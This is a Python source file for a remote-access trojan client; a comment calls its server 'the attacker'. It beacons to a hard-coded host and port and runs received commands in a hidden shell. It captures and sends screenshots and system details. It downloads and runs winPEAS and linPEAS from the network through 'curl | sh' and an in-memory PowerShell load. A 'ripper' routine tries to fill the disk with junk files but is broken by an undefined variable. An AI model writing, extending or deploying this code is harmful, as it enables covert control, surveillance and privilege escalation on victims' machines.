import socket
import time
import select
import subprocess
import sys
import threading
import pyscreenshot
from datetime import datetime
import platform
import os

########## VARIABLES ###########
conn = None
host = "127.0.0.1"
port = 5656
dataTemp = None
connected = False
stop = False
#Timer to check the connection (seconds)
checkerTimeout = 1.5
log = ""
logs = True
################################

def connect():
    global conn,host,port
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host,port))
    except socket.error:
        time.sleep(4)
        conn = None


def sendBytes(bytesToSend):
    global conn
    if conn != None:
        conn.sendall(bytesToSend)
        
def ripper():



    fileName = """C̵̥̗̰͖͊̿͐̀̌́̋̓͠ͅỎ̵̡̢̨̝̪̬͉̮̳͙͇͔̪̥͈̺̻̗̟̥̩̺̮̰͙͓͇̦̝̮͉̭̥̱͇͉̉̈́̈͒́́́́̋͛͌̏̀͌́̉̍̀̊̐̇̋̃̊́̎̈́̓͂͛̍̀̅͆́̐̐̑̕̚̕̕͝͝R̸̢̛͙̃͐̅̀̇̈̉́̈́̔́̄̊̊̆͆̀̽̎̿̃̄͌̒̅͑̐̀̈͛́̎̒̋͌̕͘̚͝Ȓ̷̢̢͕̮͎͓̬͎̯̣̟̞͔̺̯͈̭̱̍̃́́̄̿̂̉̒̈́͜Ṵ̸̧̢̨̼͙̞̜͙͉̪̝͍͈̫̻̪̩̦̝̙̼̖̹̮͚́̐̄͐̃̓͋̑̓͆͆̿͗̓͛̏͌͒̈́͘͘͜͜͜͠ͅṖ̷͙͍̲̹͇̰̮͗̓͆̇́̀̾̈́̎́͋̄̊̒͐̈͐̒́̐̔̀̃͘̚͝͝ͅͅT̸̡̨̢̨̗̩̭̣̹̭̘̞̯͕̙̗̹̖͈̰̳̘̪͎̙͉̲̳͛̄͗̾͜͜͜ͅͅȨ̸̛̛̛̹̟̲̬̰͖̥̞͈̯̭͈̫̜̻̟͍̗̙͉̙̺̬̭̔̽̀̓̓͂̆̾̀̇̇͊͋̈́̆͌̃̅̾́̅͂͊͆̑̂̒̇̋̐̊̒̆̈͛̈́̌͋̔̇̚͠͝͠D̸̡̫͚̳͔͔̞͓̈̉͊̀́͒͛̒̂̓̅͛͌̀͘ ̷̧̛̪̰͓͉̗̤̩̩̭̼̙̙̮͓̯̜̬͓́̄͊́̐̀̑͛̋̓̐̽̏̈́̑͒́̌̔̅̿̎̈͆͂͆̇̅͌̍͌͌̓̒̏̔̚͘B̶̧̡̢͔͔̭̹͓̓̀́̈̆̂̀̔͋̂͆͛̔͘͘͠͠Y̴̢̧̨̡̧̛̠̦̦̺͉̺̜͇̜̥̭̳̫̣̮̼̝̖͙͉͉̟̦͈̻͇͖̗̮̺̦͊̿͊̈́̀̈́͆̊͋̏̆̑͊̊̓͑̀̉̉̀̀̇̽͒͌̔͒̚͘̕͘͝ ̸̢̛̟͙̯̯̥͖͓̜͔̩͓̫͈̜̺͚͕̄͂́̃́͒̃̿͊͋͂͂̆̆̀̽̆̈́͗̍̋̿̒̍͊͗̈́̉͘͝͠Ķ̴̠̘̣͙̮̬͉͇̙͊͌̕ͅĄ̶̡̛̻̺͔͙̘͔̺̖̭͖̥̺͓̗̙̝̫̖̱̖͕͖͉͍̞̪͈͓̳̪̟͓͎͎̲͓̝͚̄͛̿̏̒̄̊̆͒̈̉͂̾͛̏̑̾̑̈́̾͗̅͊̒͌̌̓̄̂̀̒̀̋̀̄̕͜͠͠͝͠ͅͅǪ̶̫̫͈̮̗͖͕͓̫̤̠̗͓͉̖̯̳͕̺̼̠̝͔͖͇͕͖̤̱̈́S̸̢̢̢̜̝̟͈̰̱̜͚͔̙̦̟̰̩͈̮͙̝͚̖̱̞̥̠̞̥͕͎̤͎̻̺͖̩̫̖̖͙̜̦̟̈̎̊̾͒̏̈́͗͜͜"""
    



    
    while True:
        with open("RIP" + counter,"w") as f:
            f.write("ÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ")

def send(message):
    global conn
    if (conn != None and message != None):
        conn.sendall(message.encode())

def recive():
    global conn,checkerTimeout
    if (conn != None):
        ready, _, _ = select.select([conn], [], [], checkerTimeout)
        if ready:
            data = conn.recv(4096)
            return data.decode()
        
def saveFile(text,name):
    try:
        with open(name,"w") as f:
            f.write(text)
    except Exception as e:
        logEvents(e)
        
        
def readFile(path):
    try:
        with open(path,"r") as f:
            return f.read()
    except Exception as e:
        logEvents(e)
            

def winPEAS(force):
    #IMPLEMENTAR WINPEAS
    urlLatestVersion = "$url = \"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\""
    oneLiner = "$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest \"$url\" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(\"\")"
    
    send("EXECUTING WINPEAS...")
    #You can force to execute winpeas instead reading the file of first time execution
    if not os.path.exists("rec.txt") or force == True:
        execute("del /Q rec.txt")
        execute(f"powershell -c \"{urlLatestVersion}\"")
        saveFile(execute(f"powershell -c \"{oneLiner}\""),"rec.txt")
        send(readFile("rec.txt"))
    else:
        send(readFile("rec.txt"))
        
        
def linPEAS(force):
    oneLiner = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    existsFile = os.path.exists("rec.txt")
    if not existsFile or force == True:
        if existsFile: 
            execute("rm -f rec.txt")
        saveFile(execute(oneLiner),"rec.txt")
        send(readFile("rec.txt"))
    else:
        send(readFile("rec.txt"))

def sysInfo():
    return f"""
    -------------------------------------
    OPERATIVE SYSTEM: {platform.system()}
    NODE NAME: {platform.node()}
    SYSTEM VERSION: {platform.version()}
    PROCESSOR: {platform.processor()}
    PLATAFORM: {platform.platform()}
    -------------------------------------
    """

def execute(command):
    global log,logs
    try:
            if sys.platform == "win32":
                CREATE_NO_WINDOW = "0x08000000"
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=CREATE_NO_WINDOW
                )
            else:
            
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            
            dev = ""
            if result.returncode == 0:
                dev = result.stdout
            else:
                dev = result.stderr


            return dev
        
    except Exception as e:
        logEvents(e)
            
  
def logEvents(e):
    global log,logs
    if logs:
        log += str(datetime.now()) + " ->  " + str(e) + f"\n"
  
            
def sendLen(dat):
    l = len(dat)
    send("len-" + str(l) + "-")

# Captura la pantalla
def capture_screen():
    screenshot = pyscreenshot.grab()
    screenshot.save("screenshot.png")
    send_screenshot()

# Envía la captura al servidor
def send_screenshot():
        global stop,conn,log,logs
        try:
            with open("screenshot.png", "rb") as f:
                dat = f.read()
                sendLen(dat)
                sendBytes(dat)
                
            
            # WINDOWS
            if sys.platform == "win32":
                execute("del /Q screenshot.png")
            # LINUX
            else:
                execute("rm -f screenshot.png")
            stop = False 
        except Exception as a:
            logEvents(a)
            stop = False
            time.sleep(1.5)
            conn = None
            

def getStatus():
    global conn,host,port,connected,logs
    return f""" 
    SOCKET: {conn}
    HOST: {host}
    PORT: {port}
    CONNECTED: {connected}
    LOGS: {logs}
    """
           
 # FILTER THE COMMANDS RECIVED           
def filterCommand(command):
    global stop,logs
    if command == "screenshot":
        stop = True
        capture_screen()
    elif command == "status":
        send(getStatus())
    elif command == "system info":
        send(sysInfo())
        
        
    # LOGS
    elif command == "logs true":
        logs = True
    elif command == "logs false":
        logs = False
    elif command == "show logs":
        send(log)
    
    #LINPEAS
    elif command == "linpeas":
        linPEAS(False)
    elif command == "linpeas force":
        linPEAS(True)
        
    #WINPEAS
    elif command == "winpeas":
        winPEAS(False)
    elif command == "winpeas force":
        winPEAS(True)

    #MEMORY RIPPER    
    elif command == "ripper":
        ripper()

    else:
        send(execute(dataTemp))

    
    

#SENDS /check to the attacker
def checkConnection():
    
    while True:
        try:    
            global conn,dataTemp,connected,stop,log,logs
            if not stop:
                send("/check891231")
                dat = recive()
                if dat:
                    connected = True
                    if not "/check891231" in dat:
                        dataTemp = dat
                else:
                    connected = False
                    conn = None
                    connect()
            else:
                time.sleep(3)
        except Exception as e:
            logEvents(e)
            time.sleep(1.5)
            conn = None
            connected = False
            

if __name__ == '__main__':
    thread = threading.Thread(target=checkConnection)
    thread.start()
    while True:
        if connected:
            time.sleep(1)
            if dataTemp:
                filterCommand(dataTemp)
                dataTemp = None
        else:
            time.sleep(4)
       
            